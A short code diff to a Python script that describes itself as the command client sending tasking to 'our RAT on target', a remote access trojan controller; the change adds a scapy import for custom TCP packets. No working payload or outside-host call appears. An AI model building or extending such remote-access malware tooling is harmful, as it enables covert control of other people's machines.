@@ -3,6 +3,7 @@
 # Serves as the main CMD client interface which will provide tasking to our RAT on target
 
 import socket
+from scapy.all import * # switch from socket to scapy for custom TCP packets 
 
 EXIT = 0
 PUT = 1
